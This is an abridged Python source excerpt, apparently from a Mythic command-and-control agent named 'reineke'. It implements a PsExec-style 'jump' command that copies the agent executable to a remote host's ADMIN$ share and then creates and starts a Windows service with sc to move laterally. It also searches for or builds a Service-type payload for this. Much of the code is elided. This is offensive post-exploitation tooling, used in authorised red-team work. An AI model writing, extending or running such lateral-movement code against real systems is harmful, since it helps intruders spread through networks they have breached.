...
class JumpPSEXECArguments(TaskArguments):
    ...
    def __init__(self, command_line, **kwargs):
        ...
        self.args = [
            ...
            CommandParameter(
                ...
                default_value="C:\\Windows\\reineke.exe",
                type=ParameterType.String,
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
            ...
            CommandParameter(
                ...
                type=ParameterType.String,
                default_value="ADMIN$\\reineke.exe",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        group_name="Default",
    ...
    async def get_payloads(self, inputMsg: PTRPCDynamicQueryFunctionMessage) -> PTRPCDynamicQueryFunctionMessageResponse:
        ...
        payload_search = await SendMythicRPCPayloadSearch(MythicRPCPayloadSearchMessage(
            ...
            PayloadTypes=["reineke"],
            IncludeAutoGeneratedPayloads=False,
            BuildParameters=[MythicRPCPayloadSearchBuildParameter(PayloadType="reineke", BuildParameterValues={"output_type": "Service"})]
        ))
...
async def psexec_callback(task: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
    ...
    subtask = await SendMythicRPCTaskCreateSubtask(MythicRPCTaskCreateSubtaskMessage(
        ...
        CommandName="sc",
        #{"binpath":"C:\\Users\\itsafeature\\Desktop\\reineke_service.exe","service":"reineke","create":true,"display_name":"reineke","computer":""}
        Params=json.dumps({
            "computer": task.TaskData.args.get_arg("host"),
            "start": True,
            "service": task.TaskData.args.get_arg("remote_service_name"),
...
class JumpPSEXeCCommand(CommandBase):
    ...
    description = "Use sc to move laterally to a new host by first copying over reineke.exe."
    version = 2
    script_only = True
    ...
    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        ...
        payload = None
        if (taskData.args.get_arg("remote_path") == "ADMIN$\\reineke.exe" and
            taskData.args.get_arg("command") != "C:\\Windows\\reineke.exe") or (
                taskData.args.get_arg("remote_path") != "ADMIN$\\reineke.exe" and
                taskData.args.get_arg("command") == "C:\\Windows\\reineke.exe"
        ):
        ...
        if taskData.args.get_parameter_group_name() == "specific_payload":
            ...
            if payload.BuildParameters[0].Value != "Service":
                ...
                await SendMythicRPCTaskUpdate(MythicRPCTaskUpdateMessage(
                    TaskID=taskData.Task.ID,
                    UpdateStatus="building Service Reineke..."
                ))
